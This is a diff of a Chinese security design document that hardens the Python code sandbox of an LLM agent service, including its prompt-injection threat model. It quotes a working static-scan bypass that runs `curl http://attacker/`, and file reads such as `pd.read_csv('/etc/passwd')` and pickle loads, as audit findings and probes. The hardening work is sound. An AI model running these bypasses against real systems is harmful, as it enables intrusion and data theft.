@@ -1,6 +1,7 @@
 # python_exec 沙箱加固方案(参考 Codex 实现)
 
 > 背景:对照 [codex沙箱学习.md](./codex沙箱学习.md) 中提炼的设计原则,评估并加固 react-base-service 的 python_exec 沙箱链路。
+> 沙箱当前能力全景(能做什么/不能做什么/各防线实况)见 §一之二;§二 风险项 R1~R7 中 **P0-1(网络硬隔离)与 P0-3(Cookie 透传)已于 2026-10-03 落地**,R1 的静态扫描绕过仍存在(但可达面已被网络层封死),N2(工作目录不清理)一并修复;其余 ⚠️ 项仍未实施。
 > 威胁模型前提:**react-base-service 是多用户服务端**,python 执行的代码由 LLM 生成(可能被数据/prompt 注入影响);Codex 是本地单用户 CLI。**我们的威胁模型更严苛,没有"本地用户兜底审批"这一层**,因此对硬隔离的要求高于 Codex。
 
 ---
@@ -9,24 +10,66 @@
 
 ```
 WS /react/ws → engine ReAct 循环 → tool_dispatch → meta_tools(executePythonExec)
-  → 组装 multi-transport 信封(inline / cos_ref / http_ref)      service/react/python_exec.go:126
-  → pythonexec.Execute(HTTP POST,timeout 120s,附 Cookie)         api/pythonexec/client.go:45
+  → 组装 multi-transport 信封(inline / cos_ref / http_ref)      service/react/internal/pyexec/python_exec.go
+  → pythonexec.Execute(HTTP POST,timeout 120s,不再附 Cookie)     api/pythonexec/client.go:45
   → sandbox/server.py(ThreadingHTTPServer,0.0.0.0:8190)
       ① logId 字符白名单校验
       ② AST 静态扫描(import 白名单 + 危险调用黑名单 + dunder 限制)
       ③ run_isolated:mkdtemp 工作目录 + python -I + 最小 env + setsid
-      ④ rlimit:CPU/AS 1G/FSIZE 64M/NPROC 64/CORE 0
+         (env 注入 OPENBLAS/OMP/MKL/NUMEXPR_NUM_THREADS=1,2026-09-30)
+      ④ rlimit:CPU/AS 1G/FSIZE 64M/NPROC 128/CORE 0(NPROC 2026-09-30 由 64 放宽)
       ⑤ 60s 超时 killpg 杀整组;stdout 32M / stderr 256K 截断
   → stdout 剥 artifacts → base64 清洗 → COS 上传落库 → artifactId 回模型
 ```
 
-容器加固(docker-compose.yml:46-64):非 root 用户、只读根文件系统、tmpfs /tmp 128m、mem_limit 1g、cpus 1.5。
+容器加固(docker-compose.yml):非 root 用户、只读根文件系统、tmpfs /tmp 128m、mem_limit 1g、cpus 1.5;**网络隔离**:沙箱只挂 `sandbox-net`(`internal: true`,无出网路由、不可达 mysql/redis),仅 service 双网桥接(P0-1,2026-10-03)。
+
+工作目录清理(sandbox/server.py `run_isolated`):每次执行 mkdtemp 出的一次性目录,经 try/finally 整目录 rmtree;修复前从不清理,会在 128m tmpfs 上随调用累积直至写满(N2,2026-10-03)。
 
 **做得好的部分**(先肯定,这些都和 Codex 的做法同构):logId 白名单校验(≈Codex 的 `-D` 参数注入防御)、最小环境变量(≈Codex 的 env 白名单)、超时杀整进程组(≈kill_on_drop + 进程组)、输出截断防上下文爆炸(≈Codex 输出聚合配额)、只读根文件系统 + 非 root。
 
+## 一之二、能力全景(2026-09-30 梳理,含与风险的对照)
+
+> 本章是"沙箱现在能做什么"的权威清单。注意:**静态扫描声明的边界(无 os)是设计意图与第一层软防线,不是安全边界**——R1 的静态扫描绕过实测仍存在,但 P0-1 网络隔离已落地,绕过后的可达面被封死;凡标注 ⚠️ 处仍不应作为安全承诺。
+
+### 执行能力(沙箱本体)
+
+- Python 3.11 独立进程执行,一次性即焚:`python -I` 隔离模式 + 独立会话组 + 全新 `/tmp` 工作目录,执行之间零状态残留;
+- 预装库:numpy ≥1.26 / pandas ≥2.0 / matplotlib ≥3.8(Agg 后端,内置文泉驿中文字体,中文标签不乱码);
+- 标准库白名单:sys / json / math / statistics / datetime / io / base64(共 10 个根模块)。
+
+### 引擎侧配套(python_exec meta tool 协议)
+
+- **六种输入源**:tool_result(前序工具大结果)/ raw_json / text / expr / attachment(csv/md/txt 附件)/ http(URL);大输入走 multi-transport 信封(inline / cos_ref / http_ref)避免撑爆请求体;
+- **产物管道**:图表 base64 → 引擎上传 COS + 落库 artifact 元数据 → 前端 `artifact://` URL 渲染卡片与下载;
+- **大结果续读**:stdout 超预算落 resultRef,模型经 read_tool_result 分页续读,不占上下文;
+- **前置探查**:inspect_data 先分析 JSON/CSV 路径结构与类型样例,模型再写针对性代码;
+- **超时与指标**:沙箱 60s 超时 killpg 整组;Go 侧 120s 上限兜底;超时计数入 Prometheus(PythonExecTimeoutsTotal)。
+
+### 安全模型(六层纵深,含当前实况)
+
+| 层 | 机制 | 实况 |
+|---|---|---|
+| 1 请求校验 | logId 白名单 `[A-Za-z0-9_-]{1,128}` | ✅ 生效 |
+| 2 AST 静态扫描 | import 白名单 + 13 个危险调用黑名单 + dunder 封禁(白名单 6 个) | ⚠️ 生效但可绕过(R1 `sys.modules["os"]` 实测通过,P1-2 补强未做) |
+| 3 进程隔离 | 非 root + `-I` + 最小 env + setsid 独立进程组 | ✅ 生效 |
+| 4 内核 rlimit | CPU 65s / 内存 1G / 文件 64M / NPROC 128 / core 0 | ⚠️ fail-open(R4:setrlimit 失败被吞,P1-1 未做) |
+| 5 容器限制 | 只读根文件系统 / tmpfs 128m / mem 1g / cpus 1.5 + **网络隔离** | ✅ 生效;沙箱只在 `sandbox-net`(internal),不可出网、不可达 mysql/redis(P0-1 2026-10-03 落地,回归探针 `sandbox/tests/network_isolation_probe.py`) |
+| 6 输出限额 | stdout 32M / stderr 256K 截断 | ✅ 生效 |
+
+2026-09-30 新增:执行 env 注入 `OPENBLAS/OMP/MKL/NUMEXPR_NUM_THREADS=1`(容器 1.5 核,多线程 BLAS 为负优化且撞 NPROC);NPROC 64→128(按 UID 统计含常驻 server 线程,64 误伤正常 workload,见 fix(sandbox) 7b8bf25)。
+
+### 边界(设计意图 vs 现实)
+
+- **无网络**:白名单无 requests/urllib/socket;需要网络数据走 http 输入源由引擎侧代取。✅ 2026-10-03:R1 绕过可达 os/socket 仍成立,但 P0-1 网络隔离已落地——容器只在 internal `sandbox-net`,无出网路由、不可达 mysql/redis(回归探针 `sandbox/tests/network_isolation_probe.py`);
+- **无文件系统访问**:open() 被禁、根文件系统只读,数据只能 stdin 进 / stdout+产物出。⚠️ **该边界不成立(N1)**:pandas/numpy 的读文件 API 在白名单内且静态扫描放行,实测 `pd.read_csv("/etc/passwd")` 可通过;R1 绕过后 os 读写受 rlimit/fs 约束但未封死;
+- **无系统交互 / 无持久状态**:os、subprocess 不在白名单;进程即焚,跨调用共享数据只能走 resultRef/附件等引擎侧机制。
+
+**一句话定位:专为"表格数据进、统计结果和图表出"设计的单向分析舱;能力面刻意窄。2026-10-03 起 P0-1 网络隔离落地,安全边界由网络层承担、静态扫描降级为降噪第一层;但文件读取面未封(N1)、输出洪泛可 OOM(N3)、并发治理缺失(R5)等 P1 项仍在,多租户上线前须补齐。**
+
 ## 二、已验证的风险(按严重度)
 
-### R1【P0】AST 黑名单可绕过,且沙箱容器无网络隔离兜底
+### R1【P0,网络隔离半边已修复】AST 黑名单可绕过,且沙箱容器曾无网络隔离兜底
 
 **实测验证的绕过路径**(在 `python3 -I` 下,`os` 模块依然预加载于 `sys.modules`):
 
@@ -39,17 +82,19 @@ print(sys.modules["os"].system("curl http://attacker/"))   # 全部通过 static
 - `system` 不在 `FORBIDDEN_CALLS` 黑名单内;
 - 静态扫描对此放行,子进程内即获得任意代码执行。
 
-**而 docker-compose.yml 中 sandbox 没有任何网络隔离配置**(未定义独立 network、无 `internal: true`),与 mysql/redis/service 同在默认 bridge 网络,且可出外网。**一旦绕过静态扫描,模型(或注入者)即可直接打内网 MySQL/Redis、SSRF 内部服务、外传数据。**
+**~~而 docker-compose.yml 中 sandbox 没有任何网络隔离配置~~(2026-10-03 已修复,见 §三 P0-1 落地记录)。** 修复前沙箱与 mysql/redis/service 同在默认 bridge 网络且可出外网:一旦绕过静态扫描,模型(或注入者)即可直接打内网 MySQL/Redis、SSRF 内部服务、外传数据。**注意:静态扫描绕过本身仍未修复(R1 前半),它只是不再构成"直达内网"的后果。**
 
 这正是 Codex 哲学的反面教材:Codex **完全不做代码静态扫描**,OS 级 `(deny default)` / seccomp 才是边界。我们现在是"软防线独自承担安全边界,硬隔离缺席"。
 
 ### R2【P0】http_ref 输入源 = 预留的模型驱动 SSRF 通道
 
-`service/react/python_exec.go:520-533`:`resolvePythonExecHTTPInput` 把模型给的任意 http(s) URL 仅做格式校验后组成 `http_ref` 信封发给沙箱"自动拉取"。当前 server.py 尚未实现拉取(信封只透传给 stdin),但**协议已开**:未来任何一侧实现该拉取,即成 SSRF;且当前 URL 已能进入沙箱进程的可见数据中。
+`service/react/internal/pyexec/python_exec.go:516-533`(2026-09-30 目录重构迁移后路径,原 service/react/python_exec.go):`resolvePythonExecHTTPInput` 把模型给的任意 http(s) URL 仅做格式校验后组成 `http_ref` 信封发给沙箱"自动拉取"。当前 server.py 尚未实现拉取(信封只透传给 stdin),但**协议已开**:未来任何一侧实现该拉取,即成 SSRF;且当前 URL 已能进入沙箱进程的可见数据中。
 
-### R3【P0】用户 Cookie 透传给沙箱
+### R3【P0,2026-10-03 已修复】用户 Cookie 透传给沙箱
 
-`service/react/python_exec.go:148` 把上游用户 Cookie 原样发给 sandbox(协议里有 `cookies` 字段,server.py 收到但不用)。沙箱完全不需要 Cookie;一旦 http_ref 拉取被实现,Cookie 可能随行外泄;同时 Cookie 会出现在沙箱日志/错误信息的暴露面上。
+`service/react/internal/pyexec/python_exec.go:151`(迁移后行号) 把上游用户 Cookie 原样发给 sandbox(协议里有 `cookies` 字段,server.py 收到但不用)。沙箱完全不需要 Cookie;一旦 http_ref 拉取被实现,Cookie 可能随行外泄;同时 Cookie 会出现在沙箱日志/错误信息的暴露面上。
+
+**修复(2026-10-03)**:删除 `pythonexec.ExecuteRequest.Cookies` 字段与 `api/pythonexec/client.go` 的 `Cookie` 请求头;`python_exec.go` 不再构造透传;`sandbox/server.py` 在解析请求体后显式 `req.pop("cookies", None)`(协议文档同步标注该字段废弃)。回归测试 `TestExecuteDoesNotForwardCookies` 断言上游带 Cookie 时出站请求头无 Cookie、请求体无 `cookies` 字段。
 
 ### R4【P1】fail-open 的资源限制
 
@@ -65,13 +110,26 @@ print(sys.modules["os"].system("curl http://attacker/"))   # 全部通过 static
 
 server.py 没有任何测试。AST 扫描这类"黑名单必须持续正确"的逻辑,恰恰最需要"已知绕过尝试必须被拒绝"的回归集。Codex 的 seatbelt 测试(116KB)就是真实执行断言被拒的行为测试。
 
+### 本次复评新增发现(2026-10-03,含 N2 修复)
+
+对 `server.py` 做实测复评(逐条构造载荷跑 `static_scan`)时新发现 4 项;N2 已随本次修复,其余登记待排期:
+
+| # | 严重度 | 问题 | 状态 |
+|---|---|---|---|
+| N1 | P1 | **"无文件系统访问"边界不成立**:`open()` 被黑名单拦住,但白名单内的 pandas/numpy 读文件 API 全部放行(实测 `pd.read_csv("/etc/passwd")`、`pd.read_pickle`、`np.load(allow_pickle=True)`、`pd.read_excel` 均通过静态扫描)。其中 `read_pickle`/`allow_pickle=True` 是标准反序列化 RCE 面 | 未修复 |
+| N2 | P1 | **工作目录从不清理**:`run_isolated` 每次 `mkdtemp`,全文无 `rmtree`;128m tmpfs 随调用累积直至写满,沙箱整体不可用(**必然发生,不需要攻击者**) | ✅ 本次已修复 |
+| N3 | P1 | **输出限额是装饰性的**:`subprocess.communicate()` 先把 stdout/stderr 全量读进内存、之后才截断到 32M;**`RLIMIT_FSIZE` 只管普通文件、管不到管道**,脚本循环 print 可 OOM 沙箱容器,而"限制"看起来仍在 | 未修复 |
+| N4 | P2 | **拒绝无法结构化识别**:`_send_failure` 走 `_send_json(200, 0, "ok", ...)`,静态扫描拒绝与"脚本自身报错退出"在 HTTP 状态码/`code` 上完全一致,Go 侧只能靠 stderr 文本猜——§三 P2-3 想要的 `denyReason` 打点因此无数据可依 | 未修复 |
+
+N2 修复方式:`run_isolated` 拆为薄壳(负责 `mkdtemp` + `finally: rmtree`)+ `_run_in_workdir`(实际执行体),覆盖正常返回/启动失败/超时全部路径。实测:执行中 `/tmp/sandbox-*` = 1,执行后 = 0,`/tmp` 占用 0%。
+
 ### R7【P2,沙箱外但更紧急】免鉴权与凭证问题
 
 与本主题相关但属服务边界:`middleware/auth.go` 信任 `X-User-Name` 头可伪造;`conf/mount/custom.yaml` 提交了真实 mcpgw 凭证;mcpadmin 空配置时 fail-open。这些不属于沙箱,但决定了"谁能触发沙箱",在此一并登记。
 
 ## 三、优化方案
 
-### P0-1 沙箱网络硬隔离(最高优先级,改造成本最低收益最大)
+### P0-1 沙箱网络硬隔离(✅ 2026-10-03 已落地,改造成本最低收益最大)
 
 **Codex 原则映射**:默认全拒 + 纵深防御——静态扫描降级为"减少噪声的第一层",OS/网络层才是边界。
 
@@ -101,6 +159,13 @@ services:
 - K8s 部署时对应做法:sandbox Pod 出 `NetworkPolicy` 默认 deny egress + 仅允许来自 service 的 ingress;
 - **加一个验证手段**:部署后跑一次 R1 的绕过 PoC,断言 `curl`/内网连接失败——把"隔离生效"变成可回归的检查。
 
+**落地记录(2026-10-03)**:
+
+- `docker-compose.yml` 新增两张网:`backend`(常规,可出网)与 `sandbox-net`(`internal: true`);`sandbox` 只挂 `sandbox-net` 且删除 `ports` 映射;`service` 双网桥接;mysql/redis/minio/searxng 与监控组件全部 `backend`(故沙箱不可达它们);
+- 本机开发直连改走覆盖层 `docker-compose.dev.yml`(把 sandbox 接回 `backend` 并发布 18190),`dev.sh` 默认叠加。**发布形态(不含覆盖层)保持隔离**,`deploy.yml` 的 `docker compose up -d --build` 无需改动;
+- 验证手段落地为可执行探针 `sandbox/tests/network_isolation_probe.py`(非一次性 PoC):先用 R1 绕过通过静态扫描(**断言 1**,确保测的是硬边界而非软防线),再断言公网 1.1.1.1:443 与内网 mysql:3306 / redis:6379 均不可达(**断言 2**;按异常类型区分——`ConnectionRefused` 也算"可达",避免把"端口没开"误判成"隔离生效")。运行:`docker compose exec -T sandbox python - < sandbox/tests/network_isolation_probe.py`;
+- **双向实测**:隔离形态 → 三项全部 BLOCKED、退出码 0;对照组(叠加 dev 覆盖层) → 三项全部 OK-CONNECTED、退出码 1,证明探针有判别力、不是橡皮图章。同时确认 service 侧主路径未被破坏(`sandbox:8190/health` 在 `sandbox-net` 内正常应答;仅 `backend` 网内解析不到 sandbox)。
+
 ### P0-2 关闭或收敛 http_ref
 
 推荐二选一(按业务需要):
@@ -109,9 +174,9 @@ services:
 
 无论 A/B,server.py 协议层面应显式忽略/拒绝 `http_ref` kind,不留给未来实现者"顺手支持"的空间。
 
-### P0-3 移除 Cookie 透传
+### P0-3 移除 Cookie 透传(✅ 2026-10-03 已落地,见 §二 R3 修复记录)
 
-- 删除 `python_exec.go:148` 的 `Cookies` 字段与 `api/pythonexec/client.go` 的 Cookie 请求头;沙箱协议里的 `cookies` 字段标记 deprecated 并在 server.py 显式忽略;
+- 删除 `service/react/internal/pyexec/python_exec.go:151` 的 `Cookies` 字段与 `api/pythonexec/client.go` 的 Cookie 请求头;沙箱协议里的 `cookies` 字段标记 deprecated 并在 server.py 显式忽略;
 - 业务 HTTP 工具的 Cookie 透传(`service/tool/executor.go`)单独评估:注册 URL 白名单制 + 按工具配置是否携带凭证(最小权限),不在本次沙箱范围展开。
 
 ### P1-1 fail-closed 改造(server.py)
@@ -194,8 +259,8 @@ def _apply_limits() -> None:   # preexec_fn 中失败只能 os._exit,不能静�
 
 | 阶段 | 内容 | 改动面 |
 |---|---|---|
-| 第一周 | P0-1 网络隔离 + 部署后 PoC 验证;P0-2 http_ref 处置;P0-3 移除 Cookie | compose/python_exec.go/client.go,不动 server.py 协议主体 |
-| 第二周 | P1-1 fail-closed;P1-2 AST 补强;P1-4 测试补齐(含回归集) | server.py + 新增 tests |
+| 第一周 | ~~P0-1 网络隔离 + 部署后 PoC 验证~~(✅ 2026-10-03,验证固化为 `sandbox/tests/network_isolation_probe.py`);~~P0-3 移除 Cookie~~(✅ 2026-10-03);**P0-2 http_ref 处置仍待做** | compose/internal/pyexec/python_exec.go/client.go,不动 server.py 协议主体 |
+| 第二周 | ~~N2 工作目录清理~~(✅ 2026-10-03);P1-1 fail-closed;P1-2 AST 补强;P1-4 测试补齐(含回归集);N1 收敛文件读取面 | server.py + 新增 tests |
 | 第三周 | P1-3 并发治理;P2-3 denyReason 分类打点 | server.py + metrics |
 | 第四周起 | P2-1 profile 化;P2-2 审批接入;评估 gVisor | 按业务节奏 |
 
